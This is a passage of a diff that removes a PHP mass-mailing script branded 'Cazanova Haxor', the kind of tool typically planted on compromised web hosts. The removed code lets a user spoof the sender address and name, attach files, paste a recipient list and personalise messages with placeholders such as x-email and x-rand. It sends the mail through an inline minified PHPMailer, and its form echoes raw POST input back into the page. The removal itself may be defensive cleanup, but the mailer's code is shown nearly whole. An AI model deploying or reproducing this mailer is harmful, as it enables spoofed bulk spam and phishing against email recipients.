Dk1LC0wLjQ4MiAtMi44NDksLTAuNzc5IC01LjI2MSwtMC44OTFsMCwtMi4yODJjNC42NzYsMC4yMjIgMTEuMzk0LDAuMzM0IDIwLjE1NCwwLjMzNGM4LjY4NSwwIDE1LjA2OSwtMC4xMTIgMTkuMTUyLC0wLjMzNGwwLDIuMjgyWiIgc3R5bGU9ImZpbGw6IzM0MzQzNDtmaWxsLXJ1bGU6bm9uemVybzsiLz48cGF0aCBkPSJNNjU1LjkwOSwyMS41NDZjNC4zNDMsMCA4LjAxNywwLjQxOCAxMS4wMjQsMS4yNTNjMy4wMDYsMC44MzUgNS41MywyLjMyOSA3LjU3Miw0LjQ4MmMxLjQ4NCwxLjU1OSAyLjQ3NywzLjUzNSAyLjk3OCw1LjkyOWMwLjUwMSwyLjM5NCAwLjc1Miw1Ljc0NCAwLjc1MiwxMC4wNWwwLDMwLjUxYzAsMS44MTggMC4xMywzLjA5IDAuMzksMy44MTNjMC4yNTksMC43MjQgMC43MDUsMS4wODYgMS4zMzYsMS4wODZjMC41OTQsMCAxLjE0MSwtMC4xMzkgMS42NDIsLTAuNDE4YzAuNTAxLC0wLjI3OCAxLjE0MSwtMC42OTYgMS45MjEsLTEuMjUybDEuMTEzLDEuOTQ4Yy0xLjc4MSwxLjQ4NSAtMy44NiwyLjU1MiAtNi4yMzUsMy4yMDJjLTIuMzc2LDAuNjQ5IC01LjIzNCwwLjk3NCAtOC41NzQsMC45NzRjLTQuMDA5LDAgLTYuOTUsLTAuODA3IC04LjgyNSwtMi40MjJjLTEuODc0LC0xLjYxNCAtMi44NDgsLTMuNjg0IC0yLjkyMywtNi4yMDhjLTEuNTk2LDIuNjM2IC0zLjg0MSw0LjczMyAtNi43MzYsNi4yOTJjLTIuODk1LDEuNTU5IC02LjA4NywyLjMzOCAtOS41NzYsMi4zMzhjLTQuNDkyLDAgLTguMDA4LC0xLjE4OCAtMTAuNTUxLC0zLjU2M2MtMi41NDIsLTIuMzc2IC0zLjgxNCwtNS41NDkgLTMuODE0LC05LjUyMWMwLC0zLjg5NyAxLjE3LC03LjE0NSAzLjUwOCwtOS43NDNjMi4zMzgsLTIuNTk4IDUuOTk0LC00LjcxNCAxMC45NjgsLTYuMzQ3YzQuMDQ2LC0xLjQ0NyA3LjA0MywtMi41ODkgOC45OTEsLTMuNDI0YzEuOTQ5LC0wLjgzNSAzLjU4MiwtMS44MzcgNC45LC0zLjAwNmMxLjMxOCwtMS4xNjkgMS45NzYsLTIuNTUyIDEuOTc2LC00LjE0OGwwLC0xMC4xODljMCwtMi40MTIgLTAuNjAzLC00LjU3NCAtMS44MDksLTYuNDg2Yy0xLjIwNiwtMS45MTEgLTMuNDI0LC0yLjg2NyAtNi42NTMsLTIuODY3Yy0wLjk2NSwwIC0xLjk5NSwwLjE4NiAtMy4wOSwwLjU1N2MtMS4wOTUsMC4zNzEgLTIuMDcsMC44MzUgLTIuOTIzLDEuMzkyYzUuMDg1LDEuODkzIDcuNjI3LDUuMzI2IDcuNjI3LDEwLjNjMCwxLjc4MSAtMC40NTQsMy4zOTYgLTEuMzY0LDQuODQzYy0wLjkwOSwxLjQ0OCAtMi4xOTksMi41OTggLTMuODY5LDMuNDUyYy0xLjY3LDAuODU0IC0zLjU4MiwxLjI4MSAtNS43MzUsMS4yODFjLTEuODU2LDAgLTMuNDg5LC0wLjQzNiAtNC44OTksLTEuMzA5Yy0xLjQxMSwtMC44NzIgLTIuNTA2LC0yLjA2OSAtMy4yODUsLTMuNTkxYy0wLjc3OSwtMS41MjIgLTEuMTY5LC0zLjIxIC0xLjE2OSwtNS4wNjZjMCwtMi4zMDEgMC42NCwtNC4zMzQgMS45MjEsLTYuMDk3YzEuMjgsLTEuNzYzIDIuOTk3LC0zLjIyIDUuMTUsLTQuMzdjNC43ODgsLTIuNDUgMTAuODc1LC0zLjY3NSAxOC4yNjEsLTMuNjc1Wm0xLjgzNywyNi41MDJjLTAuNTU2LDAuOTI4IC0yLjA0MSwyLjU5OCAtNC40NTQsNS4wMWMtMy43MTEsMy42MDEgLTUuNTY3LDcuODg4IC01LjU2NywxMi44NjFjMCw1LjM4MiAxLjkzLDguMDczIDUuNzksOC4wNzNjMS41OTYsMCAzLjAwNiwtMC42MzEgNC4yMzEsLTEuODkzbDAsLTI0LjA1MVoiIHN0eWxlPSJmaWxsOiMzNDM0MzQ7ZmlsbC1ydWxlOm5vbnplcm87Ii8+PHBhdGggZD0iTTc0Mi45MjksNzQuMjcxYzAuMTg2LDAuMjU5IDAuNjQxLDAuODkgMS4zNjQsMS44OTNjMC43MjQsMS4wMDIgMS40ODUsMS44NDYgMi4yODMsMi41MzNjMC43OTgsMC42ODYgMS41NjgsMS4xMDQgMi4zMTEsMS4yNTNsMCwyLjM5NGMtMC4yOTcsMCAtMC45NjUsLTAuMDM4IC0yLjAwNSwtMC4xMTJjLTYuNTY5LC0wLjIyMiAtMTAuODk0LC0wLjMzNCAtMTIuOTcyLC0wLjMzNGMtMi4xOSwwIC02LjY4MSwwLjExMiAtMTMuNDczLDAuMzM0Yy0xLjE4OCwwLjA3NCAtMS45MzEsMC4xMTIgLTIuMjI3LDAuMTEybDAsLTIuMzk0YzEuMDc2LDAgMS45MiwtMC4xODYgMi41MzMsLTAuNTU3YzAuNjEyLC0wLjM3MSAwLjkxOCwtMC44NzIgMC45MTgsLTEuNTAzYzAsLTAuNjMxIC0wLjIwNCwtMS4yNDQgLTAuNjEyLC0xLjgzOGwtMTEuMTkxLC0xNi44NjlsLTEuMDAyLDEuMjhjLTIuODU4LDMuNjc1IC00LjI4Nyw3LjIxOSAtNC4yODcsMTAuNjM0YzAsMi40ODcgMC43NDIsNC41NTYgMi4yMjcsNi4yMDhjMS40ODUsMS42NTIgMy40NTIsMi41NyA1LjkwMiwyLjc1NmwwLDIuMjgzYy00LjYwMywtMC4yMjMgLTEwLjc4MywtMC4zMzQgLTE4LjU0LC0wLjMzNGMtMy4wNDQsMCAtNS42MDUsMC4xMTEgLTcuNjgzLDAuMzM0bDAsLTIuMjgzYzEuODkzLC0wLjkyOCAzLjY2NSwtMi4xMjUgNS4zMTcsLTMuNTkxYzEuNjUxLC0xLjQ2NiAzLjQ2MSwtMy4zODcgNS40MjgsLTUuNzYzbDExLjQ2OSwtMTMuMjVsLTE3LjQyNiwtMjYuMjIzYy0xLjE4OCwtMS44NTYgLTIuMTk5LC0zLjIxMSAtMy4wMzUsLTQuMDY1Yy0wLjgzNSwtMC44NTMgLTEuNzksLTEuMzkxIC0yLjg2NywtMS42MTRsMCwtMi4zOTRsMi4yMjcsMC4wNTZjNS43OSwwLjI1OSAxMC43ODMsMC4zODkgMTQuOTc3LDAuMzg5YzEuODE5LDAgNS42NzksLTAuMTExIDExLjU4LC0wLjMzNGMwLjk2NSwtMC4wNzQgMS41OTYsLTAuMTExIDEuODkzLC0wLjExMWwwLDIuMzk0Yy0xLjA3NiwwIC0xLjkyMSwwLjE4NSAtMi41MzMsMC41NTdjLTAuNjEyLDAuMzcxIC0wLjkxOSwwLjg3MiAtMC45MTksMS41MDNjMCwwLjU5NCAwLjIwNSwxLjIwNiAwLjYxMywxLjgzN2w5LjkxLDE0Ljk3N2wxLjk0OSwtMi4zMzljMi44MiwtMy40MTQgNC4yMzEsLTYuNjQzIDQuMjMxLC05LjY4N2MwLC0xLjk2NyAtMC42MzEsLTMuNTczIC0xLjg5MywtNC44MTZjLTEuMjYyLC0xLjI0MyAtMy4wNDQsLTEuOTU4IC01LjM0NSwtMi4xNDNsMCwtMi4yODNjNC42NzcsMC4yMjMgOS43NDMsMC4zMzQgMTUuMTk5LDAuMzM0YzMuMDQ0LDAgNS41ODcsLTAuMTExIDcuNjI4LC0wLjMzNGwwLDIuMjgzYy0zLjE1NSwxLjQxIC02LjczNyw0LjUyOCAtMTAuNzQ1LDkuMzUzbC05Ljg1NSwxMS40MTNsMTguNjUxLDI4LjA2MVoiIHN0eWxlPSJmaWxsOiMzNDM0MzQ7ZmlsbC1ydWxlOm5vbnplcm87Ii8+PHBhdGggZD0iTTc3OC4xMTYsMjEuNTQ2YzkuMzUzLDAgMTYuNTczLDIuNDU5IDIxLjY1OCw3LjM3N2M1LjA4NSw0LjkxOCA3LjYyNywxMi44ODkgNy42MjcsMjMuOTEzYzAsMTAuOTg2IC0yLjU0MiwxOC45MiAtNy42MjcsMjMuODAxYy01LjA4NSw0Ljg4MSAtMTIuMzA1LDcuMzIxIC0yMS42NTgsNy4zMjFjLTkuMzkxLDAgLTE2LjYyOCwtMi40NCAtMjEuNzEzLC03LjMyMWMtNS4wODUsLTQuODgxIC03LjYyOCwtMTIuODE1IC03LjYyOCwtMjMuODAxYzAsLTExLjAyNCAyLjU1MiwtMTguOTk1IDcuNjU2LC0yMy45MTNjNS4xMDMsLTQuOTE4IDEyLjMzMiwtNy4zNzcgMjEuNjg1LC03LjM3N1ptMCwyLjI4M2MtMi40MTMsMCAtNC4zNTIsMi4zOTQgLTUuODE4LDcuMTgyYy0xLjQ2Niw0Ljc4OCAtMi4xOTksMTIuMDYzIC0yLjE5OSwyMS44MjVjMCw5LjcyNCAwLjczMywxNi45NjIgMi4xOTksMjEuNzEzYzEuNDY2LDQuNzUxIDMuNDA1LDcuMTI2IDUuODE4LDcuMTI2YzIuNDEzLDAgNC4zNDMsLTIuMzc1IDUuNzksLTcuMTI2YzEuNDQ4LC00Ljc1MSAyLjE3MiwtMTEuOTg5IDIuMTcyLC0yMS43MTNjMCwtOS43NjIgLTAuNzI0LC0xNy4wMzcgLTIuMTcyLC0yMS44MjVjLTEuNDQ3LC00Ljc4OCAtMy4zNzcsLTcuMTgyIC01Ljc5LC03LjE4MloiIHN0eWxlPSJmaWxsOiMzNDM0MzQ7ZmlsbC1ydWxlOm5vbnplcm87Ii8+PHBhdGggZD0iTTg1NS4wMDMsMjEuNTQ2YzMuNzEyLDAgNi4zODUsMS4xNDIgOC4wMTgsMy40MjRjMS42MzMsMi4yODMgMi40NDksNC45ODMgMi40NDksOC4xMDFjMCwzLjQxNSAtMC45NTUsNi4xMzQgLTIuODY3LDguMTU2Yy0xLjkxMSwyLjAyMyAtNC40NDUsMy4wMzUgLTcuNiwzLjAzNWMtMy4zMDMsMCAtNS44MjcsLTAuNzMzIC03LjU3MSwtMi4xOTljLTEuNzQ1LC0xLjQ2NyAtMi42MTcsLTMuNDYyIC0yLjYxNywtNS45ODVjMCwtNC41MjkgMS45NDgsLTguMDczIDUuODQ2LC0xMC42MzRjLTEuMzc0LDAgLTIuNTk4LDAuMjU5IC0zLjY3NSwwLjc3OWMtMS45MywwLjgxNyAtMy41MzUsMi4xNjIgLTQuODE2LDQuMDM2Yy0xLjI4LDEuODc1IC0xLjkyLDMuOTI2IC0xLjkyLDYuMTUzbDAsMzQuMTg0YzAsMi40MTMgMC4zMzQsNC4yOTYgMS4wMDIsNS42NTFjMC42NjgsMS4zNTUgMS43MDcsMi4zMTEgMy4xMTcsMi44NjdjMS40MTEsMC41NTcgMy4zMDQsMC44MzYgNS42NzksMC44MzZsMCwyLjM5NGwtMi4zOTQsLTAuMDU2Yy02LjIzNSwtMC4yNiAtMTEuNTgsLTAuMzkgLTE2LjAzNCwtMC4zOWMtNC4zMDYsMCAtOS42MTMsMC4xMyAtMTUuOTIzLDAuMzlsLTIuMzM5LDAuMDU2bDAsLTIuMzk0YzEuNTk2LDAgMi44NTgsLTAuMjQyIDMuNzg2LC0wLjcyNGMwLjkyOCwtMC40ODMgMS41OTYsLTEuMzE4IDIuMDA1LC0yLjUwNmMwLjQwOCwtMS4xODcgMC42MTIsLTIuODM5IDAuNjEyLC00Ljk1NWwwLC0zNi4xODljMCwtMy41MjYgLTAuNDgyLC02LjA3NyAtMS40NDgsLTcuNjU1Yy0wLjk2NSwtMS41NzcgLTIuNjE2LC0yLjM2NiAtNC45NTUsLTIuMzY2bDAsLTIuMzk0YzIuNDEzLDAuMjIzIDQuNzcsMC4zMzQgNy4wNzEsMC4zMzRjNy45MDYsMCAxNC41MTMsLTAuNTIgMTkuODIxLC0xLjU1OWwwLDguMTg0YzIuOTY5LC01LjcxNiA3Ljg4NywtOC41NzQgMTQuNzUzLC04LjU3NFoiIHN0eWxlPSJmaWxsOiMzNDM0MzQ7ZmlsbC1ydWxlOm5vbnplcm87Ii8+PC9zdmc+";
-			echo base64_decode($data);
-			break;
-		case 'question-circle.svg':
-			header('Content-Type: image/svg+xml');
-			$data = "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIj48cGF0aCBkPSJNMjU2IDM0MGMtMTUuNDY0IDAtMjggMTIuNTM2LTI4IDI4czEyLjUzNiAyOCAyOCAyOCAyOC0xMi41MzYgMjgtMjgtMTIuNTM2LTI4LTI4LTI4em03LjY3LTI0aC0xNmMtNi42MjcgMC0xMi01LjM3My0xMi0xMnYtLjM4MWMwLTcwLjM0MyA3Ny40NC02My42MTkgNzcuNDQtMTA3LjQwOCAwLTIwLjAxNi0xNy43NjEtNDAuMjExLTU3LjQ0LTQwLjIxMS0yOS4xNDQgMC00NC4yNjUgOS42NDktNTkuMjExIDI4LjY5Mi0zLjkwOCA0Ljk4LTExLjA1NCA1Ljk5NS0xNi4yNDggMi4zNzZsLTEzLjEzNC05LjE1Yy01LjYyNS0zLjkxOS02Ljg2LTExLjc3MS0yLjY0NS0xNy4xNzdDMTg1LjY1OCAxMzMuNTE0IDIxMC44NDIgMTE2IDI1NS42NyAxMTZjNTIuMzIgMCA5Ny40NCAyOS43NTEgOTcuNDQgODAuMjExIDAgNjcuNDE0LTc3LjQ0IDYzLjg0OS03Ny40NCAxMDcuNDA4VjMwNGMwIDYuNjI3LTUuMzczIDEyLTEyIDEyek0yNTYgNDBjMTE4LjYyMSAwIDIxNiA5Ni4wNzUgMjE2IDIxNiAwIDExOS4yOTEtOTYuNjEgMjE2LTIxNiAyMTYtMTE5LjI0NCAwLTIxNi05Ni41NjItMjE2LTIxNiAwLTExOS4yMDMgOTYuNjAyLTIxNiAyMTYtMjE2bTAtMzJDMTE5LjA0MyA4IDggMTE5LjA4MyA4IDI1NmMwIDEzNi45OTcgMTExLjA0MyAyNDggMjQ4IDI0OHMyNDgtMTExLjAwMyAyNDgtMjQ4QzUwNCAxMTkuMDgzIDM5Mi45NTcgOCAyNTYgOHoiLz48L3N2Zz4KPCEtLQpGb250IEF3ZXNvbWUgUHJvIDUuMS4wIGJ5IEBmb250YXdlc29tZSAtIGh0dHBzOi8vZm9udGF3ZXNvbWUuY29tCkxpY2Vuc2UgLSBodHRwczovL2ZvbnRhd2Vzb21lLmNvbS9saWNlbnNlIChDb21tZXJjaWFsIExpY2Vuc2UpCi0tPg==";
-			echo base64_decode($data);
-			break;
-		default:
-			// code...
-			break;
-	}
-	exit();
-}
-if (isset($_POST['type'])) {
-	$Xemail = x_trim($_POST['email']);
-	$Xname = x_trim($_POST['name']);
-	$Xreplyto = x_trim($_POST['replyto']);
-	$Xattach = $_FILES['attach'];
-	$Xsubject = x_trim($_POST['subject']);
-	$Xletter = setup_letter($_POST['letter']);
-	$Xmaillist = x_trim($_POST['maillist']);
-	$Xtype = x_trim($_POST['type']); // type : html | text
-}
-function setup_letter($letter){
-	$letter=x_trim($letter);
-	$letter = urlencode($letter);
-	$letter = ereg_replace("%5C%22", "%22", $letter);
-	$letter = urldecode($letter);
-	$letter = stripslashes($letter);
-	return $letter;
-}
-function x_prepare($text,$email){
-	$user = explode('@',$email);
-	$text = str_replace('x-rand', strtoupper(substr(md5(microtime()),10,10)), $text);
-	$text = str_replace('x-md5', substr(md5(microtime()),10,10), $text);
-	$text = str_replace('x-time', date("h:i:s A"), $text);
-	$text = str_replace('x-date', date("m/d/Y"), $text);
-	$text = str_replace('x-email', $email, $text);
-	$text = str_replace('x-user', $user[0], $text);
-	return $text;
-}
-function x_trim($string){
-	return stripslashes(ltrim(rtrim($string)));
-}
-function x_check($email){
-	$exp = "^[a-z\'0-9]+([._-][a-z\'0-9]+)*@([a-z0-9]+([._-][a-z0-9]+))+$";
-	if(eregi($exp,$email)){
-		if(@checkdnsrr(array_pop(explode("@",$email)),"MX")){return true;}
-		else{return false;}
-	}
-	else{return false;}    
-}
-?>
-<!doctype html>
-<html lang="en">
-	<head>
-		<meta charset="utf-8">
-		<meta http-equiv="x-ua-compatible" content="ie=edge,chrome=1">
-		<title>Cazanova Haxor</title>
-		<meta name="keywords" content="">
-		<meta name="author" content="">
-		<meta name="description" content="">
-		<meta name="viewport" content="width=device-width, initial-scale=1">
-		<style>
-			*{padding:0;margin:0;box-sizing:border-box;outline:0}
-			body{background-color:#e9ebee;padding:5px;font-family:sans-serif}
-			.logo{background-image:url(?f=logo.svg);background-repeat:no-repeat;background-position:50% 50%;height:35px;margin:10px auto}
-			.wrapper{position:relative;border-radius:5px;background-color:#fff;border:1px solid #dddfe2;margin:10px auto;height:auto;min-height:400px}
-			.line{padding:10px 10px 0 10px}
-			.box{width:100%;margin:5px}
-			.title{text-transform:capitalize;font-size:12px;color:#343434;margin-bottom:5px;font-weight:700}
-			.input input,.input select,.input textarea{padding:5px;line-height:22px;font-size:14px;border:1px solid #ccc;background-color:#fff;border-radius:3px}
-			.input input:focus,.input select:focus,.input textarea:focus{border-color:#959595}
-			.input textarea{min-height:200px;resize:none}
-			.btns{margin:0 10px 10px;display:flex}
-			.btn{margin:5px;border:1px solid #ccc;background-color:#eee;border-radius:3px;color:#343434;font-size:13px;line-height:32px;padding:0 20px;cursor:pointer;transition:.2s}
-			.btn:hover{background-color:#e8e8e8}
-			.error{display:none;margin:10px 10px 0 10px;padding:10px;border:1px solid #fbd9e7;border-radius:3px;background-color:#fff5fa;font-size:12px;text-transform:uppercase}
-			.show_error{display:block}
-			.help_btn{position:relative;background-image:url(?f=question-circle.svg);background-position:50% 50%;background-repeat:no-repeat;-webkit-background-size:auto 50%;background-size:auto 50%}
-			.help_box{width:200px;display:none;font-size:13px;border:1px solid #ccc;padding:5px;border-radius:3px;bottom:-1px;position:absolute;background-color:#fff;left:50px}
-			.help_box.show_help{display:block}
-			.help_title{line-height:15px;font-weight:700}
-			.help_list{margin-left:30px}
-			.help_list li{line-height:15px}
-			.hide{display:none}
-			.letter_type{font-size:13px}
-			.letter_type label{font-size:11px}
-			.radio_box{display:inline-block;width:18px;height:18px;border:1px solid #343434;border-radius:10px;background-repeat:no-repeat;background-position:50% 50%;-webkit-background-size:80% 80%;background-size:80% 80%}
-			.letter_type input[type=radio]:checked+label .radio_box{background-image:url(?f=check.svg);background-color:#fff}
-			.check_flex{display:inline-block;margin-right:15px}
-			.check_flex label{display:flex;cursor:pointer}
-			.radio_txt{line-height:18px;display:inline-block;margin-left:2px}
-			.results{display:none;margin:0 15px 20px;font-size:13px}
-			.show_results{display:block}
-			.results table{width:100%;table-layout:fixed;border-collapse:collapse}
-			.results table tr:first-child td{font-weight:700;font-size:12px}
-			.results table tr td{padding:5px}
-			.results table tr:nth-child(n+2) td{background-color:#fbfbfb}
-			.results table tr:nth-child(2n+3) td{background-color:#f3f3f3}
-			@media (min-width:100px){
-				.logo{width:85%}
-				.wrapper{width:100%}
-				.line{display:flex;flex-direction:column}
-				.input input,.input select,.input textarea{width:calc(100% - 10px)}
-			}
-			@media (min-width:600px){
-				.line{display:flex;flex-direction:row}
-				.input input,.input select,.input textarea{width:100%}
-			}
-			@media (min-width:800px){
-				.logo{width:330px}
-				.wrapper{width:800px}
-			}
-		</style>
-	</head>
-	<body>
-		<div class="logo"></div>
-
-
-		<div class="wrapper">
-			<form action="" method="post" accept-charset="utf-8" enctype="multipart/form-data">
-				<div class="error <? if (isset($error)) echo 'show_error'; ?>"><?=$error?></div>
-				<div class="line">
-					<div class="box">
-						<div class="title">sender email</div>
-						<div class="input"><input type="text" name="email" value="<?=$_POST['email']?>"></div>
-					</div>
-					<div class="box">
-						<div class="title">sender name</div>
-						<div class="input"><input type="text" name="name" value="<?=$_POST['name']?>"></div>
-					</div>
-				</div>
-
-				<div class="line">
-					<div class="box">
-						<div class="title">Reply-to</div>
-						<div class="input"><input type="text" name="replyto" value="<?=$_POST['replyto']?>"></div>
-					</div>
-					<div class="box">
-						<div class="title">Attachment</div>
-						<div class="input"><input type="file" name="attach" multiple></div>
-					</div>
-				</div>
-
-				<div class="line">
-					<div class="box">
-						<div class="title">Subject</div>
-						<div class="input"><input type="text" name="subject" value="<?=$_POST['subject']?>"></div>
-					</div>
-				</div>
-
-				<div class="line">
-					<div class="box">
-						<div class="title">Message letter</div>
-						<div class="input"><textarea name="letter"><?=$_POST['letter']?></textarea></div>
-					</div>
-					<div class="box">
-						<div class="title">email list</div>
-						<div class="input"><textarea name="maillist"><?=$_POST['maillist']?></textarea></div>
-					</div>
-				</div>
-
-				<div class="line">
-					<div class="box letter_type">
-						<div class="title">Subject</div>
-						<div class="check_flex">
-							<input type="radio" <? if($Xtype != 'text') echo 'checked'; ?> name="type" id="type_html" value="html" class="hide">
-							<label for="type_html"><div class="radio_box"></div> <div class="radio_txt">HTML</div></label>
-						</div>
-						<div class="check_flex">
-							<input type="radio" <? if($Xtype == 'text') echo 'checked'; ?> name="type" id="type_text" value="text" class="hide">
-							<label for="type_text"><div class="radio_box"></div> <div class="radio_txt">TEXT</div></label>
-						</div>
-					</div>
-				</div>
-
-				<div class="btns">
-					<input type="submit" class="btn" id="send_btn" value="SEND">
-
-					<div class="btn help_btn">
-						<div class="help_box">
-							<div class="help_line">
-								<div class="help_title">USAGE</div>
-								<ul class="help_list">
-									<li><b>x-email</b> : reciver email</li>
-									<li><b>x-user</b> : reciver user</li>
-									<li><b>x-date</b> : date 08/30/2018</li>
-									<li><b>x-time</b> : time 10:08 AM</li>
-									<li><b>x-rand</b> : rand 10 chars</li>
-									<li><b>x-md5</b> : rand md5 hash</li>
-								</ul>
-							</div>
-						</div>
-					</div>
-
-				</div>
-
-
-
-			</form>
-
-			<div class="results <? if(isset($_POST['type'])) echo 'show_results'; ?>">
-				<table>
-					<tr>
-						<td style="width: 30px;">ID</td>
-						<td style="width: 200px;">EMAIL</td>
-						<td>STATUS</td>
-					</tr>
-				<?
-				if (isset($_POST['type'])) {
-					class PHPMailer{ public $Version='5.2.23'; public $Priority=null; public $CharSet='iso-8859-1'; public $ContentType='text/plain'; public $Encoding='8bit'; public $ErrorInfo=''; public $From='root@localhost'; public $FromName='Root User'; public $Sender=''; public $ReturnPath=''; public $Subject=''; public $Body=''; public $AltBody=''; public $Ical=''; protected $MIMEBody=''; protected $MIMEHeader=''; protected $mailHeader=''; public $WordWrap=0; public $Mailer='mail'; public $Sendmail='/usr/sbin/sendmail'; public $UseSendmailOptions=true; public $PluginDir=''; public $ConfirmReadingTo=''; public $Hostname=''; public $MessageID=''; public $MessageDate=''; public $Host='localhost'; public $Port=25; public $Helo=''; public $SMTPSecure=''; public $SMTPAutoTLS=true; public $SMTPAuth=false; public $SMTPOptions=array(); public $Username=''; public $Password=''; public $AuthType=''; public $Realm=''; public $Workstation=''; public $Timeout=300; public $SMTPDebug=0; public $Debugoutput='echo'; public $SMTPKeepAlive=false; public $SingleTo=false; public $SingleToArray=array(); public $do_verp=false; public $AllowEmpty=false; public $LE="\n"; public $DKIM_selector=''; public $DKIM_identity=''; public $DKIM_passphrase=''; public $DKIM_domain=''; public $DKIM_private=''; public $DKIM_private_string=''; public $action_function=''; public $XMailer=''; public static $validator='auto'; protected $smtp=null; protected $to=array(); protected $cc=array(); protected $bcc=array(); protected $ReplyTo=array(); protected $all_recipients=array(); protected $RecipientsQueue=array(); protected $ReplyToQueue=array(); protected $attachment=array(); protected $CustomHeader=array(); protected $lastMessageID=''; protected $message_type=''; protected $boundary=array(); protected $language=array(); protected $error_count=0; protected $sign_cert_file=''; protected $sign_key_file=''; protected $sign_extracerts_file=''; protected $sign_key_pass=''; protected $exceptions=false; protected $uniqueid='';const STOP_MESSAGE=0;const STOP_CONTINUE=1;const STOP_CRITICAL=2;const CRLF="\r\n";const MAX_LINE_LENGTH=998; public function __construct($exceptions=null){if($exceptions!==null){$this->exceptions=(boolean)$exceptions;}} public function __destruct(){$this->smtpClose();} private function mailPassthru($to,$subject,$body,$header,$params){if(ini_get('mbstring.func_overload')&1){$subject=$this->secureHeader($subject);}else {$subject=$this->encodeHeader($this->secureHeader($subject));}if(ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)){$result=@mail($to,$subject,$body,$header);}else {$result=@mail($to,$subject,$body,$header,$params);}return $result;} protected function edebug($str){if($this->SMTPDebug<=0){return;}if(!in_array($this->Debugoutput,array('error_log','html','echo')) and is_callable($this->Debugoutput)){call_user_func($this->Debugoutput,$str,$this->SMTPDebug);return;}switch($this->Debugoutput){case 'error_log':error_log($str);break;case 'html':echo htmlentities(preg_replace('/[\r\n]+/','',$str),ENT_QUOTES,'UTF-8')."<br>\n";break;case 'echo':default:$str=preg_replace('/\r\n?/ms',"\n",$str);echo gmdate('Y-m-d H:i:s')."\t".str_replace("\n","\n                   \t                  ",trim($str))."\n";}} public function isHTML($isHtml=true){if($isHtml){$this->ContentType='text/html';}else {$this->ContentType='text/plain';}} public function isSMTP(){$this->Mailer='smtp';} public function isMail(){$this->Mailer='mail';} public function isSendmail(){$ini_sendmail_path=ini_get('sendmail_path');if(!stristr($ini_sendmail_path,'sendmail')){$this->Sendmail='/usr/sbin/sendmail';}else {$this->Sendmail=$ini_sendmail_path;}$this->Mailer='sendmail';} public function isQmail(){$ini_sendmail_path=ini_get('sendmail_path');if(!stristr($ini_sendmail_path,'qmail')){$this->Sendmail='/var/qmail/bin/qmail-inject';}else {$this->Sendmail=$ini_sendmail_path;}$this->Mailer='qmail';} public function addAddress($address,$name=''){return $this->addOrEnqueueAnAddress('to',$address,$name);} public function addCC($address,$name=''){return $this->addOrEnqueueAnAddress('cc',$address,$name);} public function addBCC($address,$name=''){return $this->addOrEnqueueAnAddress('bcc',$address,$name);} public function addReplyTo($address,$name=''){return $this->addOrEnqueueAnAddress('Reply-To',$address,$name);} protected function addOrEnqueueAnAddress($kind,$address,$name){$address=trim($address);$name=trim(preg_replace('/[\r\n]+/','',$name));if(($pos=strrpos($address,'@'))===false){$error_message=$this->lang('invalid_address')." (addAnAddress $kind): $address";$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){ throw new phpmailerException($error_message);}return false;}$params=array($kind,$address,$name);if($this->has8bitChars(substr($address,++$pos)) and $this->idnSupported()){if($kind!='Reply-To'){if(!array_key_exists($address,$this->RecipientsQueue)){$this->RecipientsQueue[$address]=$params;return true;}}else {if(!array_key_exists($address,$this->ReplyToQueue)){$this->ReplyToQueue[$address]=$params;return true;}}return false;}return call_user_func_array(array($this,'addAnAddress'),$params);} protected function addAnAddress($kind,$address,$name=''){if(!in_array($kind,array('to','cc','bcc','Reply-To'))){$error_message=$this->lang('Invalid recipient kind: ').$kind;$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){ throw new phpmailerException($error_message);}return false;}if(!$this->validateAddress($address)){$error_message=$this->lang('invalid_address')." (addAnAddress $kind): $address";$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){ throw new phpmailerException($error_message);}return false;}if($kind!='Reply-To'){if(!array_key_exists(strtolower($address),$this->all_recipients)){array_push($this->$kind,array($address,$name));$this->all_recipients[strtolower($address)]=true;return true;}}else {if(!array_key_exists(strtolower($address),$this->ReplyTo)){$this->ReplyTo[strtolower($address)]=array($address,$name);return true;}}return false;} public function parseAddresses($addrstr,$useimap=true){$addresses=array();if($useimap and function_exists('imap_rfc822_parse_adrlist')){$list=imap_rfc822_parse_adrlist($addrstr,'');foreach($list as $address){if($address->host!='.SYNTAX-ERROR.'){if($this->validateAddress($address->mailbox.'@'.$address->host)){$addresses[]=array('name'=>(property_exists($address,'personal')?$address->personal:''),'address'=>$address->mailbox.'@'.$address->host);}}}}else {$list=explode(',',$addrstr);foreach($list as $address){$address=trim($address);if(strpos($address,'<')===false){if($this->validateAddress($address)){$addresses[]=array('name'=>'','address'=>$address);}}else {list($name,$email)=explode('<',$address);$email=trim(str_replace('>','',$email));if($this->validateAddress($email)){$addresses[]=array('name'=>trim(str_replace(array('"',"'"),'',$name)),'address'=>$email);}}}}return $addresses;} public function setFrom($address,$name='',$auto=true){$address=trim($address);$name=trim(preg_replace('/[\r\n]+/','',$name));if(($pos=strrpos($address,'@'))===false or (!$this->has8bitChars(substr($address,++$pos)) or !$this->idnSupported()) and !$this->validateAddress($address)){$error_message=$this->lang('invalid_address')." (setFrom) $address";$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){ throw new phpmailerException($error_message);}return false;}$this->From=$address;$this->FromName=$name;if($auto){if(empty($this->Sender)){$this->Sender=$address;}}return true;} public function getLastMessageID(){return $this->lastMessageID;} public static function validateAddress($address,$patternselect=null){if(is_null($patternselect)){$patternselect=self::$validator;}if(is_callable($patternselect)){return call_user_func($patternselect,$address);}if(strpos($address,"\n")!==false or strpos($address,"\r")!==false){return false;}if(!$patternselect or $patternselect=='auto'){if(defined('PCRE_VERSION')){if(version_compare(PCRE_VERSION,'8.0.3')>=0){$patternselect='pcre8';}else {$patternselect='pcre';}}elseif(function_exists('extension_loaded') and extension_loaded('pcre')){$patternselect='pcre';}else {if(version_compare(PHP_VERSION,'5.2.0')>=0){$patternselect='php';}else {$patternselect='noregex';}}}switch($patternselect){case 'pcre8':return (boolean)preg_match('/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)'.'((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t 